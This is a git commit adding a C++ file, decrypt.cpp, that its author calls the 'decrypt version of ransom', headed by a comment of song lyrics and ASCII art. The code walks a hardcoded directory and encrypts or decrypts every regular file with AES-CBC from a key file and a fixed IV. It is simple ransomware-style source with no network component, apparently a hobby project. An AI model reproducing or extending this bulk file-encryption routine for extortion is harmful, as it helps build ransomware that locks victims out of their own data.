fcf91b97dcbd31b5f3e8999b25d58d64085eeea9
sleepingcyber <sakhi16425@gmail.com>
2025-03-01 17:57:16 -0600

    Create decrypt.cpp
    decrypt version of ransom

---
+++ decrypt.cpp
@@ -0,0 +1,226 @@
+
+/*
+Turn you to a dancer
+Yeah (Internet Money, bitch)
+I got black, I got white, what you want?
+Hop outside a Ghost and hop up in a Phantom
+I know I'm 'bout to blow, I ain't dumb
+They try to take my flow, I take they - for ransom
+I know that I'm gone
+They see me blowin' up, now they say they want some
+I got two twin Glocks, turn you to a dancer
+I see two twin opps, leave 'em on a banner
+And I got two thick thots, wanna link the gang, yeah
+I got red, I got blue, what you want?
+The Chanel or Balenciaga, Louis and Vuitton
+She know I got the Fendi, Prada when I hit Milan
+I needed me a die or rider, I need me the one
+I started from the bottom, you could see the way I stunt
+I want all the diamonds, I want that - to weigh a ton
+The opps, they tryna line me 'cause they hate the place I'm from
+But them - don't know me, they just know the place I'm from
+I got lots of shawties tryna pull up to my place
+But you ain't want me last year, so just get up out my face
+They all up in my inbox, so I know they want a taste
+I know they want my downfall, lil' -, are you laced?
+I got black, I got white, what you want?
+Hop outside a Ghost and hop up in a Phantom
+I know I'm 'bout to blow, I ain't dumb
+They try to take my flow, I take they - for ransom
+I know that I'm gone
+They see me blowin' up, now they say they want some
+I got two twin Glocks, turn you to a dancer
+I see two twin opps, leave 'em on a banner
+And I got two thick thots, wanna link the gang, yeah
+I got black, I got white, what you want?
+Hop outside a Ghost and hop up in a Phantom
+I know I'm 'bout to blow, I ain't dumb
+They try to take my flow, I take they - for ransom
+I know that I'm gone
+They see me blowin' up, now they say they want some
+I got two twin Glocks, turn you to a dancer
+I see two twin opps, leave 'em on a banner
+And I got two thick thots, wanna link the gang, yeah
+
+
+
+....................................................................................................
+...+++++++++-:........+++++-......++++......++++.....=*@@+-........:+#%%*=......++++++.....++++++...
+...@@@@+::=@@@@@.....@@@@@@@@.....@@@@@@....@@@@..@@@@.@#%@@@%..@@@@@@*%@@@@@@..@@@@@@@...@@@@@@@...
+...@@@@%##@@@@@@....@@@@.:@@@@....@@@@@@@@-.@@@@..*@@@@@@@#:...@@@@@......@@@@%.@@@@:@@@.@@@%@@@@...
+...@@@@-.@@@@@+....@@@@@@@@@@@@...@@@@..@@@@@@@@.......@@@@@@@.@@@@@......@@@@-.@@@@.%@@@@@@.@@@@...
+...@@@@-...@@@@@-=@@@@=====*@@@@..@@@@....@@@@@@..@@@@@@@@@@@#..#@@@@@@@@@@@@...@@@@..@@@@@..@@@@...
+.......................................................@%...........................................
+....................................................................................................
++==#%@@#-.:::::.::::.......................::.:::-.                                                 
+***%@@@#-................. ................:....:-.                                                 
+***%@@@#-...............  . ..........::-:+*=-:.:-:  :+.                                   ..       
++++#@@@#-............. . .  . ..::-+@@@@%@@@#+@#**%@@@@@@@@@@@@%*                        %@@@@@@%   
++++#@@@*-..............       .=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@                     =@@@@@@@@+  
++++#@@@*-......... .         -@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                   #@@@@@@@@@: 
++++#@@@*:....              .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  *@@@@@@@@@@%
+===*@@@+:                  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=@@                #@@@@@@@@-  
+==+*%@@=     -=:..        +@@@@@@@@@@@@@@@@@@##+@@:=#@@@@@@@@@@@@@@@@@@@%             .+@@@@@@@@=   
++++=+@@=     ***+-..     -@@%@@@@@@@@@@@@@@@=-:.%@    :+#@@@@@@@@@@@@@@@@@.        .:-+#%@@=-@#.    
+##**#@@@=    -#%##++    @@@@@@@@@@@@@@@@@@@@--::@%.:::-=#@@@@@@@@@@@@@@@@@#@   :-+#%@@@@@@:         
+%@@@@@@@@     %%*+==    @@@@@@@@@@@@@@@%@@@%==--@@-:=-==#@@@@@@@@@@@@@@@@@@@  -+%@@@@@@@@@%        .
+%@@@@@@@+    .#%%##+   @@@@@@@@@@@@@@@@@@@@%=--=%@======#@@@@@@@@@@@@@@@@@#@=-+%@@@@@@@@@@@:      ..
+@@@@@@@#*    *@@@%*  -@@@@@@@@@@@@@@@@@@@@@#==--+@*---==*@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@-    :::
+@@@@@@@@=.   :-*%@    @@@@@@@@@@@@@@@@@%%@@%+--==@@=--==+%@#@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@%: =---
+@@@@@@@@..=+:...-=  =: @@@@@@@@@@@@@@@%#%#@@#++=+@#++**#%@@@@@@@@@@@@@@@@@@@@@@@@@@@*#@@@@@@@@@#*+==
+@@@@@@@-.:*==-:....    +@@@@@@@@@@@@@@@@@@@@@%***#*##%@@@@%##%@@@@@@@@@@@@@@@@@@@@*    @@@@@@@@@##+=
+@%%@@@@--##*+++-:.    @@@@@@@@@@@@@@%####%@@@@@%##%%%@@@%#**#%%@@@@@@@@@@@@@@@@@@:      =@@@@@@@@%##
+@@@@@@@+*%#*##*=.     +@@@@@@@@@@@@@@@@@@@%@#@@%###%@@%@@@@@@@@@@@@@@@@@@@@@@@@%          **++*%#%%%
+@@@@@@@@%#**#%+.      :@@@@@@@@@@@@@@@@*#++%%%@@@#@@@++#%+@@@@@@@@@@@@@@@@@@@@-                   %@
+@@@@@@@@%##%%#*+*****+=@@@@@@@@@@@@@@@+%#:=#%*%@*-+%%###%#%@@@@%@@@@@@@@@@@@%@                     @
+@@@@@@@@#**%%*=-=#%@%#-@@@@@@@@@@@@%%%%##*=+#*%%*=+#@#*****###%%@@@@%%@@@@@@@                      :
+@@@@@@@@@#*+=  .=#%%*:-@@@@@@@@@#@%####**+=##%@#+:=*@@#*#####%%@%@@@#%@@@@@@%@:                     
+@@@@@@@@@@*=:  :=*%#+:#@@@@@@@@@#%@##%****+%@@#+=:-=*@@@#+*+*%#%@@@@%@@@@@@@@@==                    
+@@%@@@@*#@#=:..:-=*=   @@@@@@@@@%%@%########%#**+++*#*@%####%%%@@@@@@@@@@@@@@-.-:                   
+#*#@@@@%%@#+=::::-=-:::@@#=@@@#@-%@@%%####**%%@@@@@@@@@#+**#%%@@@@@@@@@@@#%@%*--+-                  
+##%@@@@@@@%*=-:..:=-:. @%*@@@@@@  *@@@%%#####@@%%%%@@@%***#%@@@@@@@@@@@@==#@%=::+%:                 
+%@@@@@@@@#*=---:::::  .#+=+-@@@@  -@@@@%%####%%%%#%%@@@###%%@@@@@@@@@@@@=-+%@%+=#@%:                
+@@@@@@@#==+*+++-:.:--:......::%%@  @@@@@%@@@@@%@@%@@@@@@@@@@@@@@@@-%@@@+-:=#@@%*#@@%.               
+@@@@%*+====+*%@%%*++-:..... .. ..:.=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ :#@@@+-:=*%%%#*%@@-          ..:--
+@@@@%%#=-.....:=+=::---------------=*@@@@@@@@@@@%%#%%@%*%@@@@@@@   ::-*+::-*@@@%%@@@=   ..::--=++***
+@@@@@@%%%%#+=--:-::-+%+------------==+@@@@@@#*********#%@@@@@@@@%@%-       =@@@@@@@@@*======+**#####
+@@@@@@%%%%%%%##+=-=+*%#=---------=*@@@@@@@@@@#****+**%@@@@@@@@@@@@@@@@%=    -@@@@@@@@@@####**##%%%@@
+@@@@@@@%%%%%%%%%%*++#%#+=---=*##%%#%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%#+=:#@@@@@@@@@@#*%####@@@@@
+@@@@@@@@@@%%%%%%%@%*===+=+*####***#%+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=%%%####*+=-..*@@@@@@%. =##*#@@@@@
+@@@@@@@@%%%@%%%@@@@@+=+++***+++***##+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+%###***++=-:....=@@@@- :##*#%@@@@
+@@@@@@@@@@@@@@%%=:--==+++++++++****#+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@+%##**+**++=-:.. ...:%- .*###%@@@@
+@@@@@@@@@@@@%--:--=====+++*++++***##+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@%###**+++++====-:::...:::+###%@@@@
+@@@@@@@@@@*---::-===++++++++++=++++++%#%@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*+++++++++===----:.:--::#%%%#+=
+@%%@@@@@+----::-==+++++++++==+=++===*%###%@@@@@@@@@@@@@@@@@@@@@%#**+++++=+****++==-----::.:----#=:::
+#:     +==-----====++++****+++==+==== +*+##%@@@@@@@@@@@@@@@@@%###%++===+*###**++======---:::-==++:::
+@-    *+++========++++*****###*++====-++++++*##%%%%%@@@@@@@%%##*+#+++++#****#**+++=======--===++***%
+@@@%*##**+*+=+++++++***#*#****####+++=*+++++****###*###########*-#*+*++++***##****++++++++++++**##@@
+@@@@@@##****+*******######*++++**####*-*++++****#****#############*+++++++**########*****+*****##%%@
+@@@@@%###********########**++=++++**##-%*+****##*##############*#*++++++****###########******####%%@
+@@@@@%##**+++*****####*#***+++==++=++*==***####***#*#*########*=#**+==+++*****##########*****#####%@
+@@@@@%%#*++++++++***####***+++=========.#***************#***++**#++===++++**+*##########*****#####%@
+*/
+
+#include <cryptopp/cryptlib.h>
+
+#include <cryptopp/base64.h>
+#include <cryptopp/hex.h>
+#include <cryptopp/rsa.h>
+#include <cryptopp/aes.h>
+#include <cryptopp/files.h>
+#include <cryptopp/randpool.h>
+#include <cryptopp/validate.h>
+#include <cryptopp/modes.h>
+#include <cryptopp/osrng.h>
+#include <cryptopp/seckey.h>
+#include <cstdlib>
+#include <ctime>
+#include <fstream>
+#include <iostream>
+#include <cstring>
+#include <vector>
+#ifdef _WIN32
+#include <windows.h>
+#endif
+#include <string>
+#include <filesystem> 
+
+using namespace CryptoPP;
+using namespace std;
+/*
+std::wstring ExePath() {
+    TCHAR buffer[MAX_PATH] = { 0 };
+    GetModuleFileName( NULL, buffer, MAX_PATH );
+    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
+    return std::wstring(buffer).substr(0, pos);
+}
+*/
+void encrypt(const char* inputFile, const char* outputFile, const char* keyFile);
+void decrypt(const char* inputFile, const char* outputFile, const char* keyFile);
+unsigned char* readKeyFromFile(const char* keyFile, size_t keySize);
+std::vector<std::string> get_filenames( std::filesystem::path path );
+
+int main(){
+    int arg = 2;
+
+    string path_name = "/home/t3k3l/testdir";
+    if(arg !=3){
+        for( const auto& name : get_filenames(path_name)){
+            std::cout << name << '\n';
+            string encryptedFile = name;
+            string decryptedFile = name + "_decrypted";
+            const char* keyFile = "aeskey.bin";
+            decrypt(encryptedFile.c_str(), decryptedFile.c_str(), keyFile);
+
+        }
+    }
+    else{
+        for( const auto& name : get_filenames( path_name ) ) {
+            std::cout << name << '\n' ; 
+            string inputFile = name;
+            string encryptedFile = name + "_enc";
+            const char* keyFile = "aeskey.bin";
+            encrypt(inputFile.c_str(), encryptedFile.c_str(), keyFile);
+        }
+    }
+    
+    
+}
+
+void encrypt(const char * in, const char * out, const char* keyFile){
+    //original code from yuanhui360 on github
+    using namespace CryptoPP;
+
+    size_t key_size = 32;
+    unsigned char *key = readKeyFromFile(keyFile, key_size);
+    //(unsigned char *)"01234567890123456789012345678901";
+    unsigned char *iv = (unsigned char *)"0123456789012345";
+    
+
+    CBC_Mode<AES>::Encryption encryptor(key, key_size, iv);
+    FileSource(in, true, new StreamTransformationFilter(encryptor, new FileSink(out)));
+
+}
+
+void decrypt(const char * in, const char * out, const char* keyFile){
+//original code from yuanhui360 on github
+    using namespace CryptoPP;
+    size_t key_size = 32;
+    unsigned char *key = readKeyFromFile(keyFile, key_size);
+    unsigned char *iv = (unsigned char *)"0123456789012345";
+
+    CBC_Mode<AES>::Decryption decryptor(key, key_size, iv);
+    FileSource(in, true, new StreamTransformationFilter(decryptor, new FileSink(out)));
+    
+}
+
+unsigned char * readKeyFromFile(const char* keyFile, size_t keySize){
+    //original code from adevlib
+    ifstream fileIn;
+    fileIn.open(keyFile, ios::in | ios::binary);
+
+    unsigned char* key = (unsigned char*)malloc(keySize);
+    fileIn.read(reinterpret_cast<char*>(key), keySize);
+
+    return key;
+
+}
+std::vector<std::string> get_filenames( std::filesystem::path path )
+{
+    // code from JLBorges https://cplusplus.com/forum/windows/189681/
+    namespace stdfs = std::filesystem ;
+
+    std::vector<std::string> filenames ;
+    
+    // http://en.cppreference.com/w/cpp/experimental/fs/directory_iterator
+    const stdfs::directory_iterator end{} ;
+    
+    for( stdfs::directory_iterator iter{path} ; iter != end ; ++iter )
+    {
+        // http://en.cppreference.com/w/cpp/experimental/fs/is_regular_file 
+        if( stdfs::is_regular_file(*iter) ) // comment out if all names (names of directories tc.) are required
+            filenames.push_back( iter->path().string() ) ;
+    }
+
+    return filenames;
+}
